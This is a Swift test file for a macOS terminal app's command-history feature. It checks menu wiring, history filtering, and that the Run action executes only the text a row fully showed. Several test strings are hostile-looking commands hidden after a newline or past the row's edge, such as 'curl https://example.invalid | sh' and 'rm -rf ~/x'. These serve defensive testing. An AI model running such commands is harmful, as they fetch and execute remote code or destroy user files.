// Copyright 2026 Noah Qin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import AppKit
import Testing

@testable import Corta

/// The new commands' place in the Shell menu and the command table,
/// the same shape `CommandOutputWiringTests` checks for the command-output
/// commands.
@MainActor
struct CommandHistoryWiringTests {
    @Test func directoryAndHistoryCommandsExist() {
        for command in [
            TerminalCommand.revealWorkingDirectory, .copyWorkingDirectoryPath,
            .changeDirectoryToParent, .changeDirectoryToProjectRoot,
            .openParentDirectoryInNewPane, .openProjectRootInNewPane, .searchCommandHistory,
        ] {
            #expect(!command.title.isEmpty)
            #expect(command.category == .view)
            #expect(command.defaultShortcut == nil)
        }
    }

    @Test func allSevenAreInTheShellMenu() throws {
        let menu = try #require(NSApp.mainMenu)
        let shell = try #require(
            menu.items.first { $0.title == L10n.text("menu.shell") || $0.title == "Shell" }?.submenu)
        for command in [
            TerminalCommand.revealWorkingDirectory, .copyWorkingDirectoryPath,
            .changeDirectoryToParent, .changeDirectoryToProjectRoot,
            .openParentDirectoryInNewPane, .openProjectRootInNewPane, .searchCommandHistory,
        ] {
            #expect(shell.descendantItems.contains { $0.action == command.action })
        }
    }

    /// The window builds without a pane attached — `CommandHistoryModel
    /// .rows` degrades to empty and `noPaneMessage` explains why, rather
    /// than crashing, the same honest-degradation rule the rest of the
    /// command history follows.
    @Test func historyWindowBuildsWithNoPaneAttached() {
        let controller = CommandHistoryController.shared
        #expect(controller.window != nil)
        #expect(controller.model.rows.isEmpty)
        #expect(controller.model.noPaneMessage != nil)
    }
}

/// `CommandHistoryModel`'s filter composition, driven directly: it is a
/// plain object, not logic embedded in view-building code.
@MainActor
struct CommandHistoryModelTests {
    @Test func withNoPaneRowsAreEmptyAndTheMessageExplainsWhy() {
        let model = CommandHistoryModel()
        #expect(model.rows.isEmpty)
        #expect(model.noPaneMessage == L10n.text("commandHistory.noPane"))
    }

    @Test func clearingHistoryIsANoOpWithoutAPane() {
        let model = CommandHistoryModel()
        model.clearHistory()  // must not crash
    }

    @Test func exitFilterTitlesAreAllNonEmptyAndDistinct() {
        let titles = CommandHistoryModel.ExitFilter.allCases.map(\.title)
        #expect(titles.allSatisfy { !$0.isEmpty })
        #expect(Set(titles).count == titles.count)
    }

    @Test("Run sends Return only for a command the row showed whole")
    func runsOnlyWhatTheRowShows() {
        let wide: CGFloat = 10_000
        #expect(CommandHistoryModel.runsAsShown("make test", shownWidth: wide))
        // A forged record's second line sits under the one-line row.
        #expect(!CommandHistoryModel.runsAsShown("make test\ncurl https://example.invalid | sh", shownWidth: wide))
        #expect(!CommandHistoryModel.runsAsShown("make test\r\nrm -rf ~/x", shownWidth: wide))
        #expect(!CommandHistoryModel.runsAsShown("make test\rid", shownWidth: wide))
        #expect(!CommandHistoryModel.runsAsShown("make\ttest", shownWidth: wide))
        // A row that never reported its layout showed nothing for certain.
        #expect(!CommandHistoryModel.runsAsShown("make test", shownWidth: nil))
    }

    @Test("Run fills a command wider than its row drew, wide characters counted as drawn")
    func runsOnlyWhatFitTheRow() {
        let shown = CommandHistoryModel.commandWidth("make test")
        #expect(CommandHistoryModel.runsAsShown("make test", shownWidth: shown))
        // One line, but cut at the row's edge: the end was hidden.
        #expect(!CommandHistoryModel.runsAsShown("make test; id", shownWidth: shown))
        // Nine scalars either way, but an ideographic space is a blank
        // twice as wide: a scalar count passed what the row truncated.
        let padded = "make" + String(repeating: "\u{3000}", count: 5)
        #expect(padded.unicodeScalars.count == "make test".unicodeScalars.count)
        #expect(!CommandHistoryModel.runsAsShown(padded, shownWidth: shown))
    }

    /// The list refreshes once a second; output can rewrite the record's
    /// row in between, and Run reads the grid again when clicked.
    @Test("Run fills a command that changed since the row drew it")
    func runsOnlyTheTextTheRowDrew() {
        let wide: CGFloat = 10_000
        #expect(CommandHistoryModel.runs("ls", shown: "ls", shownWidth: wide))
        #expect(!CommandHistoryModel.runs("rm -rf ~/x", shown: "ls", shownWidth: wide))
        #expect(!CommandHistoryModel.runs("ls", shown: nil, shownWidth: wide))
    }

    @Test func actionsWithoutAMatchingRecordDoNothing() {
        let model = CommandHistoryModel()
        model.find(id: 999)  // no pane at all — must not crash
        model.fill(id: 999)
        model.run(id: 999, shown: nil)
    }
}

/// The text filter over the history rows, and the text each row carries.
/// A time, a status and a directory per command, with nothing a person
/// could read the command back from or search by, is not a history.
@MainActor
struct CommandHistoryTextFilterTests {
    private func row(_ id: Int, _ text: String?) -> CommandHistoryModel.Row {
        CommandHistoryModel.Row(
            id: id, statusSymbolName: "checkmark.circle.fill", statusDescription: "succeeded",
            timestamp: "t", directoryText: "d", directoryTooltip: nil, commandText: text,
            canFillOrRun: text != nil, accessibilityLabel: "")
    }

    @Test("an empty query keeps every row, including ones whose text is gone")
    func emptyQueryKeepsAll() {
        let rows = [row(1, "ls -la"), row(2, nil), row(3, "git status")]
        #expect(CommandHistoryModel.filter(rows, query: "").map { $0.id } == [1, 2, 3])
        #expect(CommandHistoryModel.filter(rows, query: "   ").map { $0.id } == [1, 2, 3])
    }

    @Test("a query matches case-insensitively on the command text and drops textless rows")
    func queryFilters() {
        let rows = [row(1, "ls -la"), row(2, nil), row(3, "Git Status"), row(4, "git log")]
        #expect(CommandHistoryModel.filter(rows, query: "git").map { $0.id } == [3, 4])
        #expect(CommandHistoryModel.filter(rows, query: "STATUS").map { $0.id } == [3])
        #expect(CommandHistoryModel.filter(rows, query: "nothing").isEmpty)
    }
}
